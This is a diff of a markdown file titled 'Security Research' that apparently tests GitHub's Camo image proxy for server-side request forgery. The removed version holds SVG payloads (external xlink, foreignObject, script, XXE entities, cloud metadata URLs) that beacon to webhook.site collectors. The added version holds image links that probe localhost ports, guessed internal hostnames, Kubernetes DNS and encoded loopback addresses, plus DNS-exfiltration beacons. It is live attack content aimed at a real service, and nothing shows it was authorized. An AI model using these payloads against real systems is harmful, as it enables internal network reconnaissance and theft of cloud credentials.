@@ -1,213 +1,129 @@
-# Security Research - v30
+# Security Research - v31
 
-## SVG-Based SSRF Deep Dive
+## Internal Port Scanning & Timing Attacks
 
-SVG files can contain various external references. Testing if Camo processes SVG content.
-
----
-
-### 1) SVG with xlink:href External Image
-
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-xlink.gif" width="100" height="100"/>
-</svg>
-```
-
-![svg-xlink](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-xlink-test.svg)
+Attempting to detect internal services via response timing and error behavior.
 
 ---
 
-### 2) SVG with foreignObject
+### 1) Common Internal Ports via 127.0.0.1
 
-```xml
-<svg xmlns="http://www.w3.org/2000/svg">
-  <foreignObject width="100" height="100">
-    <img src="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-foreign.gif"/>
-  </foreignObject>
-</svg>
-```
+Testing if different ports produce different timing/errors:
 
-![svg-foreign](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-foreign-test.svg)
-
----
-
-### 3) SVG use Element with External Reference
-
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <use xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/external.svg#shape"/>
-</svg>
-```
-
-![svg-use](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-use-test.svg)
+| Port | Service | Image |
+|------|---------|-------|
+| 22 | SSH | ![ssh](http://127.0.0.1:22/v31.gif) |
+| 80 | HTTP | ![http](http://127.0.0.1:80/v31.gif) |
+| 443 | HTTPS | ![https](http://127.0.0.1:443/v31.gif) |
+| 3306 | MySQL | ![mysql](http://127.0.0.1:3306/v31.gif) |
+| 5432 | PostgreSQL | ![postgres](http://127.0.0.1:5432/v31.gif) |
+| 6379 | Redis | ![redis](http://127.0.0.1:6379/v31.gif) |
+| 8080 | Alt HTTP | ![alt](http://127.0.0.1:8080/v31.gif) |
+| 9200 | Elasticsearch | ![elastic](http://127.0.0.1:9200/v31.gif) |
 
 ---
 
-### 4) SVG with External CSS
+### 2) Common Internal Services via Hostnames
 
-```xml
-<svg xmlns="http://www.w3.org/2000/svg">
-  <style>@import url(https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/style.css);</style>
-</svg>
-```
-
-![svg-css](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-css-test.svg)
+| Host | Image |
+|------|-------|
+| localhost | ![localhost](http://localhost/v31.gif) |
+| localhost:8080 | ![localhost8080](http://localhost:8080/v31.gif) |
+| localhost:3000 | ![localhost3000](http://localhost:3000/v31.gif) |
 
 ---
 
-### 5) SVG with External Font
+### 3) GitHub Internal Hostnames (Guessing)
 
-```xml
-<svg xmlns="http://www.w3.org/2000/svg">
-  <defs>
-    <font-face font-family="ExternalFont">
-      <font-face-uri xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/font.woff"/>
-    </font-face>
-  </defs>
-</svg>
-```
-
-![svg-font](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-font-test.svg)
-
----
-
-### 6) SVG with Script (XSS + SSRF)
-
-```xml
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/script.js"/>
-</svg>
-```
-
-![svg-script](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-script-test.svg)
+| Host | Image |
+|------|-------|
+| api | ![api](http://api/v31.gif) |
+| api.github.com | ![api-github](http://api.github.com/v31.gif) |
+| internal | ![internal](http://internal/v31.gif) |
+| proxy | ![proxy](http://proxy/v31.gif) |
+| cache | ![cache](http://cache/v31.gif) |
+| redis | ![redis-host](http://redis/v31.gif) |
+| db | ![db](http://db/v31.gif) |
+| mysql | ![mysql-host](http://mysql/v31.gif) |
+| postgres | ![postgres-host](http://postgres/v31.gif) |
+| consul | ![consul](http://consul/v31.gif) |
+| vault | ![vault](http://vault/v31.gif) |
+| kafka | ![kafka](http://kafka/v31.gif) |
 
 ---
 
-### 7) SVG with ENTITY External Reference (XXE)
+### 4) Docker/Kubernetes Internal DNS
 
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/xxe">
-]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <text>&xxe;</text>
-</svg>
-```
-
-![svg-xxe](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-xxe-test.svg)
+| Host | Image |
+|------|-------|
+| host.docker.internal | ![docker-host](http://host.docker.internal/v31.gif) |
+| kubernetes | ![k8s](http://kubernetes/v31.gif) |
+| kubernetes.default | ![k8s-default](http://kubernetes.default/v31.gif) |
+| kube-dns.kube-system | ![kube-dns](http://kube-dns.kube-system/v31.gif) |
 
 ---
 
-### 8) SVG with Parameter Entity (XXE)
+### 5) Common Sidecar/Mesh Services
 
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE svg [
-  <!ENTITY % remote SYSTEM "https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/evil.dtd">
-  %remote;
-]>
-<svg xmlns="http://www.w3.org/2000/svg"></svg>
-```
-
-![svg-param](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-param-test.svg)
+| Host | Image |
+|------|-------|
+| istio-proxy | ![istio](http://istio-proxy/v31.gif) |
+| envoy | ![envoy](http://envoy/v31.gif) |
+| linkerd-proxy | ![linkerd](http://linkerd-proxy/v31.gif) |
 
 ---
 
-### 9) Inline SVG Data URI with External Ref
+### 6) IPv6 Variations
 
-![data-svg](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSBocmVmPSJodHRwczovL3dlYmhvb2suc2l0ZS9lZmRhMzBjNi0xNzRiLTRjYjMtOThlNy0wMzdmMzlkMTlkNzIvZGF0YS1zdmcuZ2lmIi8+PC9zdmc+)
-
----
-
-### 10) GitHub Raw SVG URL
-
-Testing if GitHub serves raw SVG with external references:
-
-![raw-svg](https://raw.githubusercontent.com/jessi2000/progsjessi/main/test.svg)
+| Address | Image |
+|---------|-------|
+| [::1] | ![ipv6-1](http://[::1]/v31.gif) |
+| [0:0:0:0:0:0:0:1] | ![ipv6-2](http://[0:0:0:0:0:0:0:1]/v31.gif) |
+| [::ffff:127.0.0.1] | ![ipv6-3](http://[::ffff:127.0.0.1]/v31.gif) |
+| [::ffff:7f00:1] | ![ipv6-4](http://[::ffff:7f00:1]/v31.gif) |
 
 ---
 
-### 11) SVG with feImage Filter
+### 7) Alternative Localhost Representations
 
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <defs>
-    <filter id="f1">
-      <feImage xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/feimage.gif"/>
-    </filter>
-  </defs>
-  <rect filter="url(#f1)" width="100" height="100"/>
-</svg>
-```
-
-![svg-feimage](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-feimage-test.svg)
+| Format | Image |
+|--------|-------|
+| 127.1 | ![127-1](http://127.1/v31.gif) |
+| 127.0.1 | ![127-0-1](http://127.0.1/v31.gif) |
+| 0x7f000001 | ![hex-full](http://0x7f000001/v31.gif) |
+| 2130706433 | ![decimal](http://2130706433/v31.gif) |
+| 017700000001 | ![octal](http://017700000001/v31.gif) |
+| 0177.0.0.01 | ![mixed-octal](http://0177.0.0.01/v31.gif) |
 
 ---
 
-### 12) SVG Animation with External Value
+### 8) Double URL Encoding
 
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image>
-    <animate attributeName="xlink:href" values="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/anim.gif" dur="1s"/>
-  </image>
-</svg>
-```
-
-![svg-animate](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-animate-test.svg)
+| Encoding | Image |
+|----------|-------|
+| %31%32%37%2e%30%2e%30%2e%31 | ![encoded](http://%31%32%37%2e%30%2e%30%2e%31/v31.gif) |
+| %25%33%31%25%33%32%25%33%37 | ![double](http://%25%33%31%25%33%32%25%33%37/v31.gif) |
 
 ---
 
-### 13) SVG Pattern with External Image
+### 9) URL Authority Confusion
 
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <defs>
-    <pattern id="p1">
-      <image xlink:href="https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/pattern.gif"/>
-    </pattern>
-  </defs>
-</svg>
-```
-
-![svg-pattern](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-pattern-test.svg)
-
----
-
-### 14) SVG with Internal IP in xlink
-
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="http://127.0.0.1:80/internal" width="100" height="100"/>
-</svg>
-```
-
-![svg-internal](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-internal-test.svg)
-
----
-
-### 15) SVG with Cloud Metadata in xlink
-
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
-</svg>
-```
-
-![svg-metadata](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/svg-metadata-test.svg)
+| URL | Image |
+|-----|-------|
+| //127.0.0.1/v31.gif | ![slash](//127.0.0.1/v31.gif) |
+| http://foo@127.0.0.1/v31.gif | ![auth](http://foo@127.0.0.1/v31.gif) |
+| http://foo:bar@127.0.0.1/v31.gif | ![userpass](http://foo:bar@127.0.0.1/v31.gif) |
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v30-dns.efda30c6-174b-4cb3-98e7-037f39d19d72.dnshook.site/dns.gif)
+![dns](https://v31-dns.70e0ef7c-2cbf-4956-abfc-1295860c6b54.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/efda30c6-174b-4cb3-98e7-037f39d19d72/v30-canary.gif)
+![canary](https://webhook.site/70e0ef7c-2cbf-4956-abfc-1295860c6b54/v31-canary.gif)
 
 ---
 
-*v30 - SVG-based SSRF deep dive*
+*v31 - Internal port scanning & timing attacks*
